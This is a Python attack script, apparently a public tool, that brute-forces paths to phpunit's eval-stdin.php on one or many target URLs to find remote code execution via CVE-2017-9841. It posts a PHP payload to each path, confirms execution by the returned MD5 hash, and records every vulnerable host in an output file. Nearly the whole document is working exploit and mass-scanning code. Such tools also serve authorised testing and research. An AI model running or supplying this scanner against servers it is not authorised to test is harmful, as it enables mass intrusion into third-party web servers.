#!/usr/bin/env python3

# phpunit-brute.py - Finding paths to phpunit to gain RCE. (CVE-2017-9841)
#
# By @RandomRobbieBF

import requests
import sys
import argparse
import os.path
import colorama
from colorama import Fore, Style
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
session = requests.Session()


parser = argparse.ArgumentParser()
parser.add_argument("-u", "--url", required=False ,default="http://localhost",help="URL to test")
parser.add_argument("-f", "--file", default="",required=False, help="File of urls")
parser.add_argument("-p", "--proxy", default="",required=False, help="Proxy for debugging")
parser.add_argument("-o", "--output", default="",required=False, help="output file")

args = parser.parse_args()
url = args.url
urls = args.file
output = args.output

if args.proxy:
    proxy = args.proxy
else:
    proxy = ""

http_proxy = proxy
proxyDict = { 
              "http"  : http_proxy, 
              "https" : http_proxy, 
              "ftp"   : http_proxy
            }

def test_url(url,urlpath):
    newurl = ""+url+""+urlpath+""
    rawBody = "<?php echo md5(phpunit_rce);"
    headers = {"User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0","Connection":"close","Accept":"*/*","Content-Type":"application/x-www-form-urlencoded"}
    try:
        response = session.get(newurl, headers=headers,verify=False,data=rawBody, proxies=proxyDict,timeout=30)
        if response.status_code == 200:
            if "6dd70f16549456495373a337e6708865" in response.text:
                print(Style.BRIGHT + Fore.GREEN + "[+] Found RCE for "+newurl+" [+]")
                text_file = open(output, "a")
                text_file.write(""+newurl+"\n")
                text_file.close()
                return True
            else:
                print(Style.BRIGHT + Fore.RED + "[-] No Luck for "+newurl+" [-]")
        else:
            print(Style.BRIGHT + Fore.RED + "[-] No Luck for "+newurl+" [-]")
    except Exception as e:
        print ("[-]Check Url might have Issues[-]")
        print(e)
        sys.exit(0)

def grab_paths(url):
    headers = {"User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0","Connection":"close","Accept-Language":"en-US,en;q=0.5","Accept-Encoding":"gzip, deflate"}
    try:
        #response = session.get("https://raw.githubusercontent.com/random-robbie/bruteforce-lists/master/phpunit.txt", headers=headers,verify=False, proxies=proxyDict)
        #lines = response.text.strip().split('\n')

        with open("payloads.txt", 'r') as file:
          for line in file:
              lines = line.strip()
              #print(lines)
              loop = test_url(url,lines)
          file.close()

    except Exception as e:
        print("[-] Failed to obtain paths file [-]")
        print(e)
        sys.exit(0)


if urls:
    if os.path.exists(urls):
        with open(urls, 'r') as f:
            for line in f:
                url = line.replace("\n","")
                try:
                    print("Testing "+url+"")
                    grab_paths(url)
                except KeyboardInterrupt:
                    print ("Ctrl-c pressed ...")
                    sys.exit(1)
                except Exception as e:
                    print('Error: %s' % e)
                    pass
        f.close()

else:
    grab_paths(url)
